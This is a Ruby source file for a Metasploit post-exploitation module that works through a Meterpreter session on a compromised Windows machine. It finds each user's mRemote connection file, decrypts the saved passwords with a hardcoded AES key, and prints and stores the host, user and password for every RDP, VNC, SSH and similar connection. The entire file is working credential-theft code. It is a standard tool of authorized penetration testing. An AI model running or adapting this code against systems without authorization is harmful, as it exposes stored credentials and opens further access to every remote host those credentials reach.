##
# $Id$
##


##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'rex'
require 'rexml/document'


class Metasploit3 < Msf::Post

	include Msf::Auxiliary::Report


	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Windows Gather mRemote Saved Password Extraction',
				'Description'   => %q{ This module extracts saved passwords
						from mRemote. mRemote stores connections for
						RDP,VNC,SSH,Telnet,Rlogin and others. It saves
						the passwords in an encrypted format. The module
						will extract the connection info and decrypt
						the saved passwords.},
				'License'       => MSF_LICENSE,
				'Author'        =>
					[
							'TheLightCosine <thelightcosine@gmail.com>',
							'hdm', #Helped write the Decryption Routine
							'Rob Fuller <mubix@hak5.org>' #Helped write the Decryption Routine
					],
				'Version'       => '$Revision$',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))

	end

	def run
		@secret=  "\xc8\xa3\x9d\xe2\xa5\x47\x66\xa0\xda\x87\x5f\x79\xaa\xf1\xaa\x8c"
		os = session.sys.config.sysinfo['OS']
		drive = session.fs.file.expand_path("%SystemDrive%")
		if os =~ /Windows 7|Vista|2008/
			@xmlpath = 'AppData\\Local\\Felix_Deimel\\mRemote\\confCons.xml'
			@users = drive + '\\Users'
		else
			@xmlpath = 'Local Settings\\Application Data\\Felix_Deimel\\mRemote\\confCons.xml'
			@users = drive + '\\Documents and Settings'
		end
		get_users
		@userpaths.each do |upath|
			get_xml(upath)
		end

	end

	def get_users
		@userpaths=[]
		session.fs.dir.foreach(@users) do |path|
			next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
			@userpaths << "#{@users}\\#{path}\\#{@xmlpath}"
		end
	end


	def get_xml(path)
		condata=""
		begin
			xmlexists = client.fs.file.stat(path)
			connections = client.fs.file.new(path,'r')
			until connections.eof
				condata << connections.read
			end
			parse_xml(condata)
			print_status("Finished processing #{path}")
		rescue
			print_status("The file #{path} either could not be read or does not exist")
		end

	end

	def parse_xml(data)

		mxml= REXML::Document.new(data).root
		mxml.elements.to_a("//Node").each do |node|
			host = node.attributes['Hostname']
			port = node.attributes['Port']
			proto = node.attributes['Protocol']
			user = node.attributes['Username']
			domain = node.attributes['Domain']
			epassword= node.attributes['Password']
			next if epassword == nil or epassword== ""
			decoded = epassword.unpack("m*")[0]
			iv= decoded.slice!(0,16)
			pass=decrypt(decoded, @secret , iv, "AES-128-CBC")
			print_good("HOST: #{host} PORT: #{port} PROTOCOL: #{proto} USER: #{user} PASS: #{pass}")
			report_auth_info(
							:host  => host,
							:port => port,
							:sname => proto,
							:user => user,
							:pass => pass
						)

		end

	end

	def decrypt(encrypted_data, key, iv, cipher_type)
		aes = OpenSSL::Cipher::Cipher.new(cipher_type)
		aes.decrypt
		aes.key = key
		aes.iv = iv if iv != nil
		aes.update(encrypted_data) + aes.final
	end


end
